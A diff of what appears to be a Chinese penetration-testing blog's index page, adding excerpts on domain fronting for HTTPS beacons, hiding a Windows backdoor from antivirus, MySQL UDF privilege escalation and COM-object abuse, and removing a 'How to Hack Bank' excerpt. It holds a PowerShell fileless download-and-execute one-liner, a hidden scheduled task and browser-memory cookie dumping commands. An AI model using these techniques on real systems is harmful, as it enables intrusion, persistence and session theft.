@@ -117,6 +117,402 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/08/28/CloudFront-Https.html" >Domain Fronting隐藏HTTPS</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-08-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
+<p>###目标</p>
+<ol>
+<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
+<li>AWS的<code>Cloudfront</code>作为前置域名</li>
+</ol>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
+VPS(Centos)
+cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
+<pre class="line-numbers language-none"><code class="language-none">yum install httpd
+systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
+&lt;VirtualHost *:80&gt;
+   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
+   ServerName example.com
+
+
+RewriteEngine on
+RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
+RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
+&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
+<p>###目标</p>
+<ol>
+<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
+<li>AWS的<code>Cloudfront</code>作为前置域名</li>
+</ol>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
+VPS(Centos)
+cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
+<pre class="line-numbers language-none"><code class="language-none">yum install httpd
+systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
+&lt;VirtualHost *:80&gt;
+   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
+   ServerName example.com
+
+
+RewriteEngine on
+RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
+RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
+&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/08/28/hide-your-windows-backdoor.html" >Windows后门隐藏</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-08-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
+<ol>
+<li>shellcode的分离免杀</li>
+<li>C2服务器的隐藏</li>
+<li>Windows后门的设置</li>
+</ol>
+<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
+<ol>
+<li>通信: <code>socket</code>,<code>http</code></li>
+<li><code>shellcode</code>的执行方式</li>
+<li><code>shellcode</code>的流量</li>
+<li>远程服务器的隐藏</li>
+</ol>
+<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
+<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
+<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
+<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
+	
+
+	</div>
+  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
+<ol>
+<li>shellcode的分离免杀</li>
+<li>C2服务器的隐藏</li>
+<li>Windows后门的设置</li>
+</ol>
+<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
+<ol>
+<li>通信: <code>socket</code>,<code>http</code></li>
+<li><code>shellcode</code>的执行方式</li>
+<li><code>shellcode</code>的流量</li>
+<li>远程服务器的隐藏</li>
+</ol>
+<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
+<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
+<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
+<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
+	
+	</div>
+  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/07/29/mysql-UDF.html" >MySql UDF提权注意事项</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-07-29  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
+<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
+show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>结果如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
++----------------------+---------------------------+
+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
++-------------------------+--------+
+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
++-------------------------+--------+
+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
+<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
++-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
+<p>可以在开启mysql的时候设置plugin的目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">指定目录:
+mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
+	
+
+	</div>
+  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
+<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
+show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>结果如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
++----------------------+---------------------------+
+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
++-------------------------+--------+
+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
++-------------------------+--------+
+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
+<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
++-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
+<p>可以在开启mysql的时候设置plugin的目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">指定目录:
+mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
+	
+	</div>
+  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-07-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/05/14/workgroup-pentest2.html" >内网渗透流水账</a>
 		</h3>
 		</div>
@@ -191,382 +587,6 @@ hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/05/06/python-elk.html" >Python处理xlsx到ELK</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-05-06  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
-	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
-	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
-	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
-	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
-	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
-	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
-	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<ul>
-<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
-</ul>
-
-	
-
-	</div>
-  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
-	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
-	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
-	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
-	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
-	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
-	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
-	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<ul>
-<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/04/22/how-to-hack-bank.html" >How to Hack Bank</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-04-22  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
-</blockquote>
-<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
-strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
-findstr PHPSESSID * .dmp&gt; tmp
-strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
-<li>常用的操作用一个后门</li>
-<li>留一个备用的后门，第一个失效之后启用</li>
-</ol>
-<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
-<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
-post&#x2F;windows&#x2F;gather&#x2F;screen_spy
-
-再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
-
-
-使用Windows自带的PSR截屏：
-psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
-Start-Sleep -s 20;
-psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
-realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
-all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
-living that way. So I began to spend more time away from my computer, with other people, 
-learning to open myself to the world, to feel my emotions, to connect with others, to accept 
-risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
-more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
-my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
-</blockquote>
